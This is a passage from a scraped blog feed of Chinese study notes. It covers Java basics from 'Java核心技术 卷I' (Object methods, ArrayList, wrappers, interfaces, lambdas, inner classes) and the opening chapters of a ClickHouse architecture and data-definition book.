Object：所有类的父类</h3><p>Java中所有类都由Object类扩展而来，如果没有明确指出父类，Object就被认为是这个类的父类。</p><p>例如可以使用Object类型的变量引用任何类型的对象：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Object obj = <span class="hljs-keyword">new</span> Employee(<span class="hljs-string">"Harry Hacker"</span>,<span class="hljs-number">35000</span>)</code></pre></div><p>Object类型的变量只能用于作为各种值的通用持有者。要想对其中的内容进行具体的操作，还需要清楚对象的原始类型，并进行相应的类型转换：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Employee e = (Employee) obj;</code></pre></div><blockquote><p>在Java中，只有基本类型（primitive types）不是对象，例如，数值、字符和布尔类型的值都不是对象</p></blockquote><h4 id="5-2-1-equals方法"><a href="#5-2-1-equals方法" class="headerlink" title="5.2.1 equals方法"></a>5.2.1 equals方法</h4><p>Object类中的equals方法用于检,测一个对象是否等于另外一个对象（Java中变量也是对象，虽然变量的值不是）</p><h4 id="5-2-2-相等测试与继承"><a href="#5-2-2-相等测试与继承" class="headerlink" title="5.2.2 相等测试与继承"></a>5.2.2 相等测试与继承</h4><p>Java语言规范要求equals方法具有下面的特性：</p><ul><li>自反性：对于任何非空引用x,<code>x.equals(x)</code>应该返回true</li><li>对称性：对于任何引用x和y，当且仅当<code>y.equals(x)</code>返回true, <code>x.equals(y)</code>也应该返回true</li><li>传递性：对于任何引用x、y和z，如果<code>x.equals(y)</code>返回true, <code>y.equals(z)</code>返回true, <code>x.equals(z)</code>也应该返回true</li><li>一致性：如果x和y引用的对象没有发生变化，反复调用<code>x.equals(y)</code>应该返回同样的结果。</li><li>对于任意非空引用x, <code>x.equals(null)</code>应该返回false。</li></ul><p>（这里涉及一个“如果隐式和显式的参数不属于同一个类，equals方法将如何处理”的问题，解决步骤较长，略…）</p><h4 id="5-2-3-hashCode方法"><a href="#5-2-3-hashCode方法" class="headerlink" title="5.2.3 hashCode方法"></a>5.2.3 hashCode方法</h4><p>散列码（hash code）是由对象导出的一个整型值。</p><p>如果x和y是两个不同的对象，x.hashCode( )与y.hashCode( )基本上不会相同。</p><h4 id="5-2-4-toString方法"><a href="#5-2-4-toString方法" class="headerlink" title="5.2.4 toString方法"></a>5.2.4 toString方法</h4><p>Object中的<code>toString</code>方法用于返回表示对象值的字符串，例如Employee类中的toString方法的实现如下：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> <span class="hljs-string">"Employee[name="</span> + name <span class="hljs-string">",salary="</span> + salary + <span class="hljs-string">",hireDay="</span> + hireDay + <span class="hljs-string">"]"</span>;}</code></pre></div><h3 id="5-3-泛型数组列表"><a href="#5-3-泛型数组列表" class="headerlink" title="5.3 泛型数组列表"></a>5.3 泛型数组列表</h3><p>Java中运行时确定数组的大小（而不是在编译时就必须确定），可以通过<code>ArrayList</code>类来实现。</p><p>ArrayList是一个采用类型参数（type parameter）的泛型类（generic class）。为了指定数组列表保存的元素对象类型，需要用一对尖括号将类名括起来加在后面，例如：<code>ArrayList&lt;Employee&gt;</code></p><p>下面声明和构造一个保存Employee对象的数组列表：</p><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Employee&gt; staff = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();</code></pre></div><p>使用add方法可以将元素添加到数组列表中。例如，下面展示了如何将Employee对象添加到数组列表中：</p><div class="hljs code-wrapper"><pre><code class="hljs java">staff.add(<span class="hljs-keyword">new</span> Employee(<span class="hljs-string">"Harry Hacker"</span>,...));</code></pre></div><p>如果知道要存储多少个元素，可以通过<code>ensureCapacity</code>方法分配空间（然后还是要add）：</p><div class="hljs code-wrapper"><pre><code class="hljs java">staff.ensureCapacity(<span class="hljs-number">100</span>);</code></pre></div><p>通过<code>size</code>方法查看数组列表的实际元素数目：</p><div class="hljs code-wrapper"><pre><code class="hljs java">staff.size()</code></pre></div><p>使用<strong>get</strong>和<strong>set</strong>方法实现访问或改变数组元素的操作（而不常见的<code>变量[ ]</code>语法格式）</p><div class="hljs code-wrapper"><pre><code class="hljs java">Employee e = staff.get(i);<span class="hljs-comment">// 获取数组列表的元素,类似: Employee e = a[i]</span>staff.set(i,harry);<span class="hljs-comment">// 设置第i个元素的值,类似: staff[i] = harry</span></code></pre></div><h3 id="5-4-对象包装器与自动装箱"><a href="#5-4-对象包装器与自动装箱" class="headerlink" title="5.4 对象包装器与自动装箱"></a>5.4 对象包装器与自动装箱</h3><p>Java中int这样的基本类型也可以转换为对象。所有的基本类型都有一个与之对应的类。例如，Integer类对应基本类型int。通常，这些类称为包装器（wrapper）。包装器类拥有的关键字：Integer、Long、Float、Double、Short、Byte、Character、Void和Boolean。</p><blockquote><p>对象包装器类是不可变的，即一旦构造了包装器，就不允许更改包装在其中的值。同时，对象包装器类还是final，因此不能定义它们的子类</p></blockquote><p>比如声明一个整型数组列表（尖括号参数不能是基本类型，即不能写成 ArrayList&lt; int &gt;），通过Integer对象包装器来声明：</p><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Integer&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();</code></pre></div><p>元素添加还是和ArrayList操作一样，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">list.add(<span class="hljs-number">3</span>); <span class="hljs-comment">// 自动装箱：自动转为成 list.add(Integer.valueOf(3))</span>    <span class="hljs-keyword">int</span> n = list.get(i); <span class="hljs-comment">// 自动拆箱：自动转换成 list.get(i).intValue()</span></code></pre></div><h3 id="5-5-参数数量可变的方法"><a href="#5-5-参数数量可变的方法" class="headerlink" title="5.5 参数数量可变的方法"></a>5.5 参数数量可变的方法</h3><p>Java SE 5.0之后的版本提供了可以用可变的参数数量调用的方法，例如下面这段代码接受任意个double类型的参数，从中寻找其中的最大值并在控制台输出：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">double</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">double</span>...values)</span> </span>{<span class="hljs-keyword">double</span> largest=Double.MIN_VALUE;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">double</span> v:values) {<span class="hljs-keyword">if</span>(v&gt;largest) {largest=v;}}<span class="hljs-keyword">return</span> largest;}<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{<span class="hljs-keyword">double</span> m=max(<span class="hljs-number">1.2</span>,<span class="hljs-number">3.4</span>,<span class="hljs-number">56.7</span>,<span class="hljs-number">345.45</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);System.out.println(m);}}</code></pre></div><h3 id="5-6-枚举类"><a href="#5-6-枚举类" class="headerlink" title="5.6 枚举类"></a>5.6 枚举类</h3><p>所有的枚举类型都是Enum类的子类，最常用的方法是<code>toString</code>（所有的枚举类型都是Enum类的子类）</p><p>toString的逆方法是静态方法<code>valueOf</code></p><div class="hljs code-wrapper"><pre><code class="hljs java">Size.SMALL.toString() <span class="hljs-comment">//返回字符串"SMALL"</span>Size s = Enum.valueOf(Size.calss,<span class="hljs-string">"SMALL"</span>)<span class="hljs-comment">//将s设置成Size.SMALL</span></code></pre></div><p>每个枚举类型都有一个静态的values方法，它将返回一个包含全部枚举值的数组</p><h3 id="5-7-反射"><a href="#5-7-反射" class="headerlink" title="5.7 反射"></a>5.7 反射</h3><p>能够分析类能力的程序称为<strong>反射（reflective）</strong>，有个反射库用以编写能够动态操纵Java代码的程序。</p><p>反射机制可以用来：</p><ul><li>在运行时分析类的能力</li><li>在运行时查看对象（例如编写一个toString方法供所有类使用）</li><li>实现通用的数组操作代码</li><li>利用方法对象（这个对象很像C++中的函数指针）</li></ul><h4 id="5-7-1-Class类"><a href="#5-7-1-Class类" class="headerlink" title="5.7.1 Class类"></a>5.7.1 Class类</h4><p>Java会为所有对象维护一个被称为<strong>运行时</strong>的类型标识，这个信息跟踪着每个对象所属的类，保存这些信息的类被称为<strong>Class</strong>。（最常用的Class方法是getName，例如<code>a.getClass( ).getName( )</code>，<code>b.getName( )</code>）</p><h4 id="5-7-2-捕获异常"><a href="#5-7-2-捕获异常" class="headerlink" title="5.7.2 捕获异常"></a>5.7.2 捕获异常</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span>{<span class="hljs-comment">// 写入可能会报错的代码</span>}<span class="hljs-keyword">catch</span>(Exception e){<span class="hljs-comment">// 针对异常进行处理的代码</span>}</code></pre></div><p><code>Exception</code>是一个类</p><p>（反射还有很多内容，略）</p><h3 id="5-8-继承的设计技巧"><a href="#5-8-继承的设计技巧" class="headerlink" title="5.8 继承的设计技巧"></a>5.8 继承的设计技巧</h3><ol><li>将公共操作和实例域放在父类</li><li>不要使用受保护的域</li><li>使用继承实现”is-a”关系</li><li>除非所有继承的方法都有意义，否则不要使用继承</li><li>覆盖方法时，不要改变预期的行为</li><li>使用多态，而非类型信息</li><li>不要过多得使用反射</li></ol><h2 id="第6章-接口、lambda表达式与内部类"><a href="#第6章-接口、lambda表达式与内部类" class="headerlink" title="第6章 接口、lambda表达式与内部类"></a>第6章 接口、lambda表达式与内部类</h2><h3 id="6-1-接口"><a href="#6-1-接口" class="headerlink" title="6.1 接口"></a>6.1 接口</h3><h4 id="6-1-1-接口概念"><a href="#6-1-1-接口概念" class="headerlink" title="6.1.1 接口概念"></a>6.1.1 接口概念</h4><p>在Java程序设计语言中，<strong>接口（interface）不是类</strong>，而是对类的一组需求描述（类是对编写者的角度来看的，而接口是使用者的角度，对于使用者来说并不需要关注接口的具体实现 ~ 简单说接口就是一堆打包好了的方法）</p><p>接口通过关键字<code>interface</code>实现，比如Comparable接口：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Comparable</span></span><span class="hljs-class"></span>{<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(Object other)</span></span>;}</code></pre></div><p><strong>对象所属的类必须实现了接口的方法</strong>，即在上面的例子中，任何实现Comparable接口的类都需要包含compareTo方法，并且这个方法的参数必须是一个Object对象，返回一个整型数值。</p><h4 id="6-1-2-接口的特性"><a href="#6-1-2-接口的特性" class="headerlink" title="6.1.2 接口的特性"></a>6.1.2 接口的特性</h4><p>接口的特性：</p><ul><li>接口不是类，不能new</li><li>虽然不能构造接口的对象，但能声明接口的变量</li><li>接口变量必须引用实现了接口的类对象</li></ul><h4 id="6-1-3-接口与抽象类"><a href="#6-1-3-接口与抽象类" class="headerlink" title="6.1.3 接口与抽象类"></a>6.1.3 接口与抽象类</h4><p>抽象类很难</p><p>抽象类有个问题：每个类只能继承自一个类（Java的类不允许多重继承）</p><p>而接口可以提供多重继承的大多数好处，又能避免多重继承的复杂性和低效性。</p><h4 id="6-1-4-静态方法"><a href="#6-1-4-静态方法" class="headerlink" title="6.1.4 静态方法"></a>6.1.4 静态方法</h4><p>静态方法是一种不能向对象实施操作的方法。例如，Math类的pow方法就是一个静态方法。</p><p>静态方法通常放在类里面，而不是放在接口里。</p><h4 id="6-1-5-默认方法"><a href="#6-1-5-默认方法" class="headerlink" title="6.1.5 默认方法"></a>6.1.5 默认方法</h4><p><code>default</code>可以为接口方法提供一个默认实现：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">T</span>&gt;</span><span class="hljs-class"></span>{    <span class="hljs-function"><span class="hljs-keyword">default</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(T other)</span> </span>{<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}}</code></pre></div><p>一般没啥用，因为这个接口的每个实际实现都要覆盖这个方法</p><h4 id="6-1-6-解决默认方法冲突"><a href="#6-1-6-解决默认方法冲突" class="headerlink" title="6.1.6 解决默认方法冲突"></a>6.1.6 解决默认方法冲突</h4><p>如果先在一个接口中将一个方法定义为默认方法，然后又在父类或另一个接口中定义了同样的方法，那么会这样：</p><ol><li>父类优先。如果父类提供了一个具体方法，同名而且有相同参数类型的默认方法会被忽略。</li><li>接口重复。如果一个超接口（接口的父？）提供了一个默认方法，另一个接口提供论一个同盟而且参数类型相同的方法，那么必须覆盖这个方法来解决冲突。</li></ol><h3 id="6-2-接口示例"><a href="#6-2-接口示例" class="headerlink" title="6.2 接口示例"></a>6.2 接口示例</h3><h4 id="6-2-1-接口与回调"><a href="#6-2-1-接口与回调" class="headerlink" title="6.2.1 接口与回调"></a>6.2.1 接口与回调</h4><p><strong>回调（callback）</strong>是一种常见的程序设计模式，可以指定事件发生时采取的动作（比如点击某个按钮就弹出页面）</p><h4 id="6-2-2-Comparator接口"><a href="#6-2-2-Comparator接口" class="headerlink" title="6.2.2 Comparator接口"></a>6.2.2 Comparator接口</h4><p>略</p><h4 id="6-2-3-对象克隆"><a href="#6-2-3-对象克隆" class="headerlink" title="6.2.3 对象克隆"></a>6.2.3 对象克隆</h4><p>Cloneable接口（略）</p><h3 id="6-3-lambda表达式"><a href="#6-3-lambda表达式" class="headerlink" title="6.3 lambda表达式"></a>6.3 lambda表达式</h3><h4 id="6-3-1-为什么引入lambda表达式"><a href="#6-3-1-为什么引入lambda表达式" class="headerlink" title="6.3.1 为什么引入lambda表达式"></a>6.3.1 为什么引入lambda表达式</h4><p>如果要将代码块作为参数传递到某个对象，还是比较麻烦的（因为只有String类型比较符合，所以处理起来麻烦）</p><h4 id="6-3-2-lambda表达式的语法"><a href="#6-3-2-lambda表达式的语法" class="headerlink" title="6.3.2 lambda表达式的语法"></a>6.3.2 lambda表达式的语法</h4><p>lambda表达式就是一个代码块，以及写上代码的变量规范</p><div class="hljs code-wrapper"><pre><code class="hljs java">(String first, String second) -&gt; first.length() - second.length()</code></pre></div><p>lambda表达式形式：<kbd>参数,箭头(-&gt;),表达式</kbd>，即使没有参数也要提供空括号</p><h4 id="6-3-3-函数式接口"><a href="#6-3-3-函数式接口" class="headerlink" title="6.3.3 函数式接口"></a>6.3.3 函数式接口</h4><p>对于只有一个抽象方法的接口，需要这种接口的对象时，就可以提供一个lambda表达式。这种接口称为函数式接口（functional interface）。</p><h4 id="6-3-4-方法引用"><a href="#6-3-4-方法引用" class="headerlink" title="6.3.4 方法引用"></a>6.3.4 方法引用</h4><p>利用方法引用可以实现现成的方法可以完成你想要传递到其他代码的某个动作</p><p>例如希望出现定时器事件就打印这个事件对象，可以调用：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Timer t = <span class="hljs-keyword">new</span> Timer(<span class="hljs-number">1000</span>, event -&gt; System.out.println(event));</code></pre></div><p>上面这个例子本来参数是(1000,event)的，加上了lambda表达式就调用完这个方法后打印一遍event</p><p>通过方法引用，可以直接把println方法传递到Timer构造器这样就更方便了，具体实现：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Timer t = <span class="hljs-keyword">new</span> Timer(<span class="hljs-number">1000</span>,System.out::println)</code></pre></div><p>表达式<code>System.out::println</code>是一个方法引用（method reference），它等价于lambda表达式<code>x -&gt; System.out.println(x)</code></p><h4 id="6-3-5-构造器引用"><a href="#6-3-5-构造器引用" class="headerlink" title="6.3.5 构造器引用"></a>6.3.5 构造器引用</h4><p>构造器引用与方法引用很类似，只不过方法名为new</p><h4 id="6-3-6-变量作用域"><a href="#6-3-6-变量作用域" class="headerlink" title="6.3.6 变量作用域"></a>6.3.6 变量作用域</h4><p>略</p><h4 id="6-3-7-处理lambda表达式"><a href="#6-3-7-处理lambda表达式" class="headerlink" title="6.3.7 处理lambda表达式"></a>6.3.7 处理lambda表达式</h4><p>略</p><h4 id="6-3-7-处理lambda表达式-1"><a href="#6-3-7-处理lambda表达式-1" class="headerlink" title="6.3.7 处理lambda表达式"></a>6.3.7 处理lambda表达式</h4><h2 id="6-4-内部类"><a href="#6-4-内部类" class="headerlink" title="6.4 内部类"></a>6.4 内部类</h2><p><strong>内部类（inner class）</strong>是定义在另一个类中的类，使用内部类的主要原因有三点：</p><ul><li>内部类方法可以访问该类定义所在的作用域中的数据，包括私有的数据</li><li>内部类可以对同一个包中的其他类隐藏起来</li><li>当想要定义一个回调函数且不想编写大量代码时，使用匿名（anonymous）内部类比较便捷。</li></ul><h4 id="6-4-6-匿名内部类"><a href="#6-4-6-匿名内部类" class="headerlink" title="6.4.6 匿名内部类"></a>6.4.6 匿名内部类</h4><p>将局部内部类的使用再深入一步。假如只创建这个类的一个对象，就不必命名了。这种类被称为<strong>匿名内部类（anonymous inner class）</strong></p><h4 id="6-4-7-静态内部类"><a href="#6-4-7-静态内部类" class="headerlink" title="6.4.7 静态内部类"></a>6.4.7 静态内部类</h4><p>使用内部类只是为了把一个类隐藏在另外一个类的内部，并不需要内部类引用外围类对象。为此，可以将内部类声明为static，以便取消产生的引用。</p><h3 id="6-5-代理"><a href="#6-5-代理" class="headerlink" title="6.5 代理"></a>6.5 代理</h3><p>利用<strong>代理（proxy）</strong>可以在运行时创建一个实现了一组给定接口的新类</p><p>（用得很少，因为这种功能只有在编译时无法确定需要实现哪个接口时才有必要使用）</p><hr><p><strong>完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</strong></p><blockquote><p>这里只是基础部分，后面还有Java并发比较重要，不过我觉得Java并发还是单独一篇来写吧，另外，这本书的案例相对来说还是没那么贴合没有开发经验的小白。个人建议没有做过后端开发的读者可以看完《Java核心技术 卷I》后看看 <a href="https://how2j.cn，这个网站以游戏作为案例通俗易懂地讲解了Java的各个部分。如果《Java核心技术" target="_blank" rel="noopener">https://how2j.cn，这个网站以游戏作为案例通俗易懂地讲解了Java的各个部分。如果《Java核心技术</a> 卷I》里有什么看不懂的，去这里看看也许会恍然大悟。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《ClickHouse原理解析与应用实践》阅读笔记</title>
      <link href="/2021/11/10/%E3%80%8AClickHouse%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/11/10/%E3%80%8AClickHouse%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ClickHouse好秀啊</p><a id="more"></a><h2 id="第2章-ClickHouse架构概述"><a href="#第2章-ClickHouse架构概述" class="headerlink" title="第2章 ClickHouse架构概述"></a>第2章 ClickHouse架构概述</h2><h3 id="2-1-ClickHouse的核心特性"><a href="#2-1-ClickHouse的核心特性" class="headerlink" title="2.1 ClickHouse的核心特性"></a>2.1 ClickHouse的核心特性</h3><h4 id="2-1-2-列式存储与数据压缩"><a href="#2-1-2-列式存储与数据压缩" class="headerlink" title="2.1.2 列式存储与数据压缩"></a>2.1.2 列式存储与数据压缩</h4><p>行式存储：逐行扫描</p><p>列式存储：逐列扫描</p><h4 id="2-1-3-向量化执行引擎"><a href="#2-1-3-向量化执行引擎" class="headerlink" title="2.1.3 向量化执行引擎"></a>2.1.3 向量化执行引擎</h4><p>向量化执行引擎：一项消除程序循环的优化<br>（原理上类似增加空间复杂度减少时间复杂度）</p><p>通过CPU的SIMD指令（Single Instruction Multiple Data,SIMD）即用单条指令操作多条数据，从而通过数据并行以提高性能，它的原理是在CPU寄存器层面实现数据的并行操作。</p><blockquote><p>ClickHouse目前用SSE4.2指令集实现向量化执行</p></blockquote><h4 id="2-1-4-关系模型与SQL查询"><a href="#2-1-4-关系模型与SQL查询" class="headerlink" title="2.1.4 关系模型与SQL查询"></a>2.1.4 关系模型与SQL查询</h4><p>相比HBase和Redis这类NoSQL数据库，ClickHouse使用关系模型描述并提供了传统数据库的概念（数据库、表、视图、函数等）。此外ClickHouse完全使用SQL作为查询语言。</p><h4 id="2-1-5-表引擎"><a href="#2-1-5-表引擎" class="headerlink" title="2.1.5 表引擎"></a>2.1.5 表引擎</h4><p>ClickHouse共拥有合并树、内存、文件、接口和其他等6大类20多种的表引擎。</p><h4 id="2-1-7-多主架构"><a href="#2-1-7-多主架构" class="headerlink" title="2.1.7 多主架构"></a>2.1.7 多主架构</h4><p>不同于HDFS、Spark、ElasticSearch这类采用主从架构（Master-Slave）的分布式系统，ClickHouse采用多主架构（Multi-Master）。</p><h4 id="2-1-8-在线查询"><a href="#2-1-8-在线查询" class="headerlink" title="2.1.8 在线查询"></a>2.1.8 在线查询</h4><p>在线查询（好像就是即席查询，指用户临时写的查询语句并且需要立刻得到返回结果）</p><p>ClickHouse在在线查询方面很快（相比Hive、Spark SQL），而且开源（Vertica性能很好，但是价格很高）</p><h4 id="2-1-9-数据分片与分布式查询"><a href="#2-1-9-数据分片与分布式查询" class="headerlink" title="2.1.9 数据分片与分布式查询"></a>2.1.9 数据分片与分布式查询</h4><ul><li><p>数据分片</p><p>分片是一种大数据处理下的分治思想，ClickHouse支持数据分片。</p><p>一个集群由1到多个分片组成，每个分片对应ClickHouse的1个服务节点（故数据分片数量取决于ClickHouse服务节点数）</p></li></ul><ul><li><p>分布式查询</p><p>ClickHouse提供本地表（Local Tabel）和分布式表（Distributed Table）。</p><p>本地表等同于一份数据分片</p><p>分布式表不存储数据，它是本地表的代理访问，类似分库中间件，能够代理访问多个数据分片，从而实现分布式查询。ClickHouse</p></li></ul><h3 id="2-2-ClickHouse的架构设计"><a href="#2-2-ClickHouse的架构设计" class="headerlink" title="2.2 ClickHouse的架构设计"></a>2.2 ClickHouse的架构设计</h3><h4 id="2-2-1-Column和Field"><a href="#2-2-1-Column和Field" class="headerlink" title="2.2.1 Column和Field"></a>2.2.1 Column和Field</h4><p>ClickHouse按列存储数据，内存中一列数据由一个Column对象表示；Column采用泛化的设计模式。</p><p>ClickHouse都会以整列的方式操作数据，除非需要操作具体单个的数值（也就是单列中的一行数据），则需要使用Field对象，Field对象代表一个单值；Field采用聚合的设计模式，内部聚合了Null、UInt64、String、Array等13种数据类型及相应的处理逻辑。</p><h4 id="2-2-2-DataType"><a href="#2-2-2-DataType" class="headerlink" title="2.2.2 DataType"></a>2.2.2 DataType</h4><p>ClickHouse数据的序列化和反序列化工作由DataType负责。IDataType采用泛华的设计模式，支持二进制、文本、json、xml、csv、protobuf等多种格式。</p><h4 id="2-2-3-Block和Block流"><a href="#2-2-3-Block和Block流" class="headerlink" title="2.2.3 Block和Block流"></a>2.2.3 Block和Block流</h4><p>Column和Filed组成了数据的基本映射单元，但对应实际操作中缺少了必要补充信息，所以ClickHouse设计了Block。</p><p>Block对象本质是由数据对象、数据类型和列名称组成的三元组，即（Column，DataType，列名称字符串）。</p><p>Column提供数据读取能力，DataType负责正反序列化，所以Block在这些对象的基础上实现了进一步的抽象和封装，使得仅通过Block对象就能完成一系列的数据操作（Block并没有直接聚合Column和DataType对象，而是间接引用）。</p><p>Block流有两个顶层接口，分别是IBlockInputStream和IBlockOutputStream，每个顶层接口又有很多类方法。</p><div class="hljs code-wrapper"><pre class="mermaid">graph LRA[Block流] --&gt;B(IBlockInputStream)    A --&gt; C(IBlockOutputStream)    B --&gt; D(DDL操作)    B --&gt; E(关系运算)    B --&gt; F(表引擎)    C --&gt; G(表引擎)</pre></div><h4 id="2-2-4-Table"><a href="#2-2-4-Table" class="headerlink" title="2.2.4 Table"></a>2.2.4 Table</h4><p>数据表的底层设计中并没有所谓的Table对象，它直接使用<code>IStorage接口</code>指代数据表。</p><p>IStorage定义了DDL（如ALTER、RENAME、OPTIMIZE、DROP等）、read、write方法，它们分别负责数据的定义、查询、写入。</p><p>对Table发起的一次操作通常都会经历这样的过程：接收AST查询语句（抽象语法树，简称AST），根据AST返回指定列的数据，之后再将数据交由Interpreter做进一步处理。</p><h4 id="2-2-5-Parser和Interpreter"><a href="#2-2-5-Parser和Interpreter" class="headerlink" title="2.2.5 Parser和Interpreter"></a>2.2.5 Parser和Interpreter</h4><p>Parser负责创建AST对象（将SQL以递归下降的方法发解析成AST语法树）；Interpreter负责解释AST，并进一步创建查询的执行管道（起到串联查询过程的作用，会根据解释器的雷系聚合它所需要的资源）。</p><h4 id="2-2-6-Functions和Aggregate-Functions"><a href="#2-2-6-Functions和Aggregate-Functions" class="headerlink" title="2.2.6 Functions和Aggregate Functions"></a>2.2.6 Functions和Aggregate Functions</h4><p>ClickHouse主要提供两类函数：普通函数（无状态）和聚合函数（有状态）。</p><p>普通函数由IFunctions定义，聚合函数由IAggregateFunctions接口定义，并支持序列化和反序列化。</p><h4 id="2-2-7-Cluster和Replication"><a href="#2-2-7-Cluster和Replication" class="headerlink" title="2.2.7 Cluster和Replication"></a>2.2.7 Cluster和Replication</h4><p>ClickHouse的集群由分片（Shard）组成，而每个分片又通过副本（Replica）组成，其具有以下特性：</p><ol><li>ClickHouse的1个节点只能拥有1个分片</li><li>分片只是一个逻辑概念，其物理承载还是由副本承担。</li></ol><h2 id="第3章-安装与部署（略）"><a href="#第3章-安装与部署（略）" class="headerlink" title="第3章 安装与部署（略）"></a>第3章 安装与部署（略）</h2><h2 id="第4章-数据定义"><a href="#第4章-数据定义" class="headerlink" title="第4章 数据定义"></a>第4章 数据定义</h2><h3 id="4-1-数据类型"><a href="#4-1-数据类型" class="headerlink" title="4.1 数据类型"></a>4.1 数据类型</h3><ul><li>基础类型</li></ul><table><thead><tr><th>基础类型</th><th>具体类型</th></tr></thead><tbody><tr><td>数值类型</td><td>Int、Float、Decimal</td></tr><tr><td>字符串类型</td><td>String、FixedString、UUID</td></tr><tr><td>时间类型</td><td>DateTime、DateTime64、Date</td></tr></tbody></table><ul><li><p>复合类型</p><ol><li>Array</li><li>Tuple</li><li>Enum</li><li>Nested</li></ol></li><li><p>特殊类型</p><ol><li>Nullable</li><li>Domain</li></ol></li></ul><h3 id="4-2-如何定义数据表"><a href="#4-2-如何定义数据表" class="headerlink" title="4.2 如何定义数据表"></a>4.2 如何定义数据表</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> db_name [<span class="hljs-keyword">ENGINE</span> = Oridinary]</code></pre></div><p>ENGINE处的参数表示数据库所使用的引擎，一共有五种：</p><ul><li>Oridinary：默认引擎，大部分情况都用这个</li><li>Dictionary：字典引擎</li><li>Memory：内存引擎</li><li>Lazy：日志引擎</li><li>MySQL：MySQL引擎</li></ul><h3 id="4-5-分布式DDL执行"><a href="#4-5-分布式DDL执行" class="headerlink" title="4.5 分布式DDL执行"></a>4.5 分布式DDL执行</h3><p>普通DDL语句转化为分布式DDL语句，只需加上<code>ON CLUSTER cluster_name</code>声明即可，如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> t1 <span class="hljs-keyword">ON</span> CLUSTER ch_cluster (<span class="hljs-keyword">id</span> <span class="hljs-keyword">String</span>,    <span class="hljs-keyword">url</span> <span class="hljs-keyword">String</span>,    EventTime <span class="hljs-built_in">Date</span>) <span class="hljs-keyword">ENGINE</span> = MergeTree()<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> toYYYYMM(EventTime)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><p> 该语句会对ch_cluster集群内所有节点广播这条DDL语句</p><h2 id="第5章-数据字典"><a href="#第5章-数据字典" class="headerlink" title="第5章 数据字典"></a>第5章 数据字典</h2><p>数据字典是ClickHouse提供的一种存储介质，它以（键值，属性映射）的形式定义数据。</p><p>数据字典被<strong>加载到内存</strong>，支持动态更新，因而数据字典非常适合保存常量或者经常使用的维度表数据，以避免不必要的JOIN查询。</p><div class="hljs code-wrapper"><pre class="mermaid">graph LRA[数据字典] --&gt;B(内置字典 _ ClickHouse默认自带的字典)    A --&gt; C(外部扩展字典 _ 用户自定义配置实现的字典)</pre></div><p>字典中的数据只能通过<strong>字典函数</strong>访问（有一种例外情况，就是使用特殊的字典表引擎）</p><ul><li>7种类型字典的特点总结</li></ul><table><thead><tr><th>名称</th><th>存储结构</th><th>字典键类型</th><th>支持的数据来源</th></tr></thead><tbody><tr><td>flat</td><td>数组</td><td>UInt64</td><td>Local file、 Executable file、 HTTP、DBMS</td></tr><tr><td>hashed</td><td>散列</td><td>UInt64</td><td>Local file、 Executable file、 HTTP、DBMS</td></tr><tr><td>range_hashed</td><td>散列并按时间排序</td><td>UInt64和时间</td><td>Local file、 Executable file、 